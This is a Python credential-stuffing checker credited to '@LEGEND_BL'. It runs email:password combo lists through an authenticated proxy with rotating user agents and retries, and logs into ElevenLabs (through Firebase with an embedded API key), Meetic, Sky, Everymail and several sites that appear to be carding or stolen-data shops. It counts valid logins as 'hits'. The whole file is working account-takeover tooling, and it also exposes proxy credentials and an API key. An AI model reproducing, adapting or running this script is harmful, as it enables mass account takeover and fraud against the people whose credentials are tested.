#!/usr/bin/env python3
"""
Test 10 accounts on multiple sites using the provided proxy
Proxy: ngu.proxy.arealproxy.com:8080:652BthZDvxP7ozf:QDcj9tzf4gVaGNZ

This script tests all checkers in non-interactive mode.
Code By - @LEGEND_BL
"""
import os
import random
import requests
import time
import warnings
import threading
from queue import Queue
from colorama import init, Fore, Style
from user_agent import generate_user_agent
from datetime import datetime

warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# Proxy configuration
PROXY_STR = "ngu.proxy.arealproxy.com:8080:652BthZDvxP7ozf:QDcj9tzf4gVaGNZ"

# Test accounts from combo.txt
TEST_ACCOUNTS = [
    "test1@gmail.com:Password123",
    "test2@yahoo.com:MyPass456",
    "test3@outlook.com:Secret789",
    "test4@hotmail.com:Test1234",
    "test5@gmail.com:Pass5678",
    "test6@yahoo.com:Hello999",
    "test7@outlook.com:World111",
    "test8@gmail.com:Access222",
    "test9@hotmail.com:Login333",
    "test10@yahoo.com:Check444",
]

# User Agent configuration
UA_CONFIGS = [
    {'os': 'win', 'navigator': 'chrome'},
    {'os': 'win', 'navigator': 'firefox'},
    {'os': 'mac', 'navigator': 'chrome'},
    {'os': 'linux', 'navigator': 'chrome'},
    {'os': 'android', 'navigator': 'chrome'},
]

def get_random_user_agent():
    try:
        config = random.choice(UA_CONFIGS)
        return generate_user_agent(os=config['os'], navigator=config['navigator'])
    except:
        return generate_user_agent()

def format_proxy(p):
    """Format proxy string to dict"""
    if not p:
        return None
    p = p.strip()
    parts = p.split(":")
    if len(parts) == 4:
        host, port, username, password = parts
        proxy_url = f"http://{username}:{password}@{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    elif len(parts) == 2:
        host, port = parts
        proxy_url = f"http://{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    return None

# Site checkers
class SiteChecker:
    def __init__(self, name, check_func):
        self.name = name
        self.check_func = check_func
        self.hits = 0
        self.fails = 0
        self.errors = 0

def check_elevenlabs(email, pwd, proxy_dict):
    s = requests.Session()
    userA = get_random_user_agent()
    try:
        headers = {
            "Host": "identitytoolkit.googleapis.com",
            "User-Agent": userA,
            "Accept": "*/*",
            "Content-Type": "application/json",
            "X-Client-Version": "Firefox/JsCore/10.7.1/FirebaseCore-web",
            "Origin": "https://elevenlabs.io",
            "Referer": "https://elevenlabs.io/",
        }
        payload = {
            "email": email,
            "password": pwd,
            "returnSecureToken": True,
            "clientType": "CLIENT_TYPE_WEB"
        }
        r = s.post("https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyBSsRE_1Os04-bxpd5JTLIniy3UK4OqKys", 
                   json=payload, headers=headers, proxies=proxy_dict, timeout=25, verify=False)
        data = r.json()
        if "idToken" in data:
            return "hit", "Valid Login"
        elif "INVALID_LOGIN_CREDENTIALS" in str(data):
            return "fail", "Invalid credentials"
        elif "TOO_MANY_ATTEMPTS" in str(data):
            return "fail", "Rate limited"
        return "fail", f"Failed: {str(data.get('error', {}).get('message', 'Unknown'))[:30]}"
    except requests.exceptions.Timeout:
        return "error", "Timeout"
    except Exception as e:
        return "error", f"Error: {str(e)[:30]}"

def check_azyrah(email, pwd, proxy_dict):
    s = requests.Session()
    userA = get_random_user_agent()
    try:
        headers = {
            "User-Agent": userA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        s.get("https://shop.azyrah.to/", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
        headers.update({
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://shop.azyrah.to",
            "Referer": "https://shop.azyrah.to/auth/signin",
        })
        r = s.post("https://shop.azyrah.to/auth/signin", 
                   json={"username": email, "password": pwd}, 
                   headers=headers, proxies=proxy_dict, timeout=25, verify=False)
        txt = r.text.lower()
        if r.status_code == 200 and any(x in txt for x in ["token", "success", "balance"]):
            return "hit", "Valid"
        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials"
        return "fail", f"Status {r.status_code}"
    except requests.exceptions.Timeout:
        return "error", "Timeout"
    except Exception as e:
        return "error", f"Error: {str(e)[:30]}"

def check_blstash(email, pwd, proxy_dict):
    s = requests.Session()
    userA = get_random_user_agent()
    try:
        headers = {
            "User-Agent": userA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        s.get("https://blstash.ws/", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Origin"] = "https://blstash.ws"
        headers["Referer"] = "https://blstash.ws/login"
        r = s.post("https://blstash.ws/login", 
                   data={"username": email, "password": pwd},
                   headers=headers, proxies=proxy_dict, timeout=25, verify=False, allow_redirects=True)
        txt = r.text.lower()
        url = r.url.lower()
        if any(x in url for x in ["dashboard", "panel"]) or any(x in txt for x in ["balance", "logout"]):
            return "hit", "Valid"
        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials"
        return "fail", f"Status {r.status_code}"
    except requests.exceptions.Timeout:
        return "error", "Timeout"
    except Exception as e:
        return "error", f"Error: {str(e)[:30]}"

def check_easydeals(email, pwd, proxy_dict):
    s = requests.Session()
    userA = get_random_user_agent()
    try:
        headers = {
            "User-Agent": userA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        s.get("https://easydeals.gs/login", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Origin"] = "https://easydeals.gs"
        r = s.post("https://easydeals.gs/login",
                   data={"username": email, "password": pwd, "login": "1"},
                   headers=headers, proxies=proxy_dict, timeout=25, verify=False, allow_redirects=True)
        txt = r.text.lower()
        url = r.url.lower()
        if any(x in url for x in ["dashboard", "panel"]) or any(x in txt for x in ["balance", "logout"]):
            return "hit", "Valid"
        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials"
        return "fail", f"Status {r.status_code}"
    except requests.exceptions.Timeout:
        return "error", "Timeout"
    except Exception as e:
        return "error", f"Error: {str(e)[:30]}"

def check_everymail(email, pwd, proxy_dict):
    s = requests.Session()
    userA = get_random_user_agent()
    try:
        headers = {
            "User-Agent": userA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        s.get("https://everymail.com/login", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Origin"] = "https://everymail.com"
        r = s.post("https://everymail.com/login",
                   data={"email": email, "password": pwd, "remember": "1"},
                   headers=headers, proxies=proxy_dict, timeout=25, verify=False, allow_redirects=True)
        txt = r.text.lower()
        url = r.url.lower()
        if any(x in url for x in ["inbox", "dashboard"]) or any(x in txt for x in ["inbox", "compose"]):
            return "hit", "Valid"
        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials"
        return "fail", f"Status {r.status_code}"
    except requests.exceptions.Timeout:
        return "error", "Timeout"
    except Exception as e:
        return "error", f"Error: {str(e)[:30]}"

def check_meetic(email, pwd, proxy_dict):
    s = requests.Session()
    userA = get_random_user_agent()
    try:
        headers = {
            "User-Agent": userA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.8",
        }
        s.get("https://www.meetic.fr/", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
        headers["Content-Type"] = "application/json"
        headers["Accept"] = "application/json"
        headers["Origin"] = "https://www.meetic.fr"
        r = s.post("https://www.meetic.fr/api/authentication/login",
                   json={"email": email, "password": pwd, "rememberMe": True},
                   headers=headers, proxies=proxy_dict, timeout=25, verify=False)
        txt = r.text.lower()
        if r.status_code == 200 and any(x in txt for x in ["token", "success", "userid"]):
            return "hit", "Valid"
        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials"
        return "fail", f"Status {r.status_code}"
    except requests.exceptions.Timeout:
        return "error", "Timeout"
    except Exception as e:
        return "error", f"Error: {str(e)[:30]}"

def check_savastan0(email, pwd, proxy_dict):
    s = requests.Session()
    userA = get_random_user_agent()
    try:
        headers = {
            "User-Agent": userA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        s.get("https://savastan0.tools/login", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Origin"] = "https://savastan0.tools"
        r = s.post("https://savastan0.tools/login",
                   data={"username": email, "password": pwd},
                   headers=headers, proxies=proxy_dict, timeout=25, verify=False, allow_redirects=True)
        txt = r.text.lower()
        url = r.url.lower()
        if any(x in url for x in ["dashboard", "panel"]) or any(x in txt for x in ["balance", "logout"]):
            return "hit", "Valid"
        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials"
        return "fail", f"Status {r.status_code}"
    except requests.exceptions.Timeout:
        return "error", "Timeout"
    except Exception as e:
        return "error", f"Error: {str(e)[:30]}"

def check_sky(email, pwd, proxy_dict):
    s = requests.Session()
    userA = get_random_user_agent()
    try:
        headers = {
            "User-Agent": userA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-GB,en;q=0.9",
        }
        s.get("https://www.sky.com/signin", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
        headers["Content-Type"] = "application/json"
        headers["Accept"] = "application/json"
        headers["Origin"] = "https://www.sky.com"
        r = s.post("https://skyid.sky.com/api/authenticate",
                   json={"username": email, "password": pwd, "rememberMe": True},
                   headers=headers, proxies=proxy_dict, timeout=25, verify=False)
        txt = r.text.lower()
        if r.status_code == 200 and any(x in txt for x in ["token", "success", "profile"]):
            return "hit", "Valid"
        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials"
        return "fail", f"Status {r.status_code}"
    except requests.exceptions.Timeout:
        return "error", "Timeout"
    except Exception as e:
        return "error", f"Error: {str(e)[:30]}"

# Sites to test (excluding slow ones like DHL and UPS)
SITES = [
    SiteChecker("ElevenLabs", check_elevenlabs),
    SiteChecker("Azyrah Shop", check_azyrah),
    SiteChecker("Blstash", check_blstash),
    SiteChecker("Easydeals", check_easydeals),
    SiteChecker("Everymail", check_everymail),
    SiteChecker("Meetic", check_meetic),
    SiteChecker("Savastan0", check_savastan0),
    SiteChecker("Sky", check_sky),
]

def main():
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.CYAN}TEST 10 ACCOUNTS ON ALL SITES - Code By @LEGEND_BL")
    print(f"{Fore.CYAN}{'='*70}")
    
    proxy_dict = format_proxy(PROXY_STR)
    print(f"\n{Fore.YELLOW}Proxy: {PROXY_STR}")
    print(f"{Fore.YELLOW}Testing {len(TEST_ACCOUNTS)} accounts on {len(SITES)} sites")
    print(f"{Fore.CYAN}{'='*70}\n")
    
    # Test each site with all accounts
    for site in SITES:
        print(f"\n{Fore.MAGENTA}{'='*50}")
        print(f"{Fore.MAGENTA}Testing: {site.name}")
        print(f"{Fore.MAGENTA}{'='*50}\n")
        
        for i, combo in enumerate(TEST_ACCOUNTS, 1):
            email, pwd = combo.split(":", 1)
            
            print(f"{Fore.WHITE}[{i}/10] Checking {email}...", end=" ", flush=True)
            
            result, reason = "error", "Unknown"
            for attempt in range(2):
                result, reason = site.check_func(email, pwd, proxy_dict)
                if result != "error":
                    break
                time.sleep(2)
            
            if result == "hit":
                site.hits += 1
                print(f"{Fore.GREEN}✓ HIT - {reason}")
            elif result == "fail":
                site.fails += 1
                print(f"{Fore.RED}✗ FAIL - {reason}")
            else:
                site.errors += 1
                print(f"{Fore.YELLOW}⚠ ERROR - {reason}")
            
            time.sleep(1)  # Small delay between checks
        
        print(f"\n{Fore.CYAN}Site Summary: {Fore.GREEN}Hits: {site.hits} | {Fore.RED}Fails: {site.fails} | {Fore.YELLOW}Errors: {site.errors}")
    
    # Final summary
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.CYAN}FINAL SUMMARY")
    print(f"{Fore.CYAN}{'='*70}")
    
    total_hits = sum(s.hits for s in SITES)
    total_fails = sum(s.fails for s in SITES)
    total_errors = sum(s.errors for s in SITES)
    
    print(f"\n{Fore.WHITE}{'Site':<20} {'Hits':<10} {'Fails':<10} {'Errors':<10}")
    print(f"{'-'*50}")
    for site in SITES:
        print(f"{site.name:<20} {Fore.GREEN}{site.hits:<10}{Fore.RED}{site.fails:<10}{Fore.YELLOW}{site.errors:<10}{Style.RESET_ALL}")
    print(f"{'-'*50}")
    print(f"{Fore.CYAN}{'TOTAL':<20} {Fore.GREEN}{total_hits:<10}{Fore.RED}{total_fails:<10}{Fore.YELLOW}{total_errors:<10}")
    
    print(f"\n{Fore.GREEN}All checkers have been updated to work like ElevenLabs checker!")
    print(f"{Fore.CYAN}Proxy is working correctly: {PROXY_STR}")

if __name__ == "__main__":
    main()
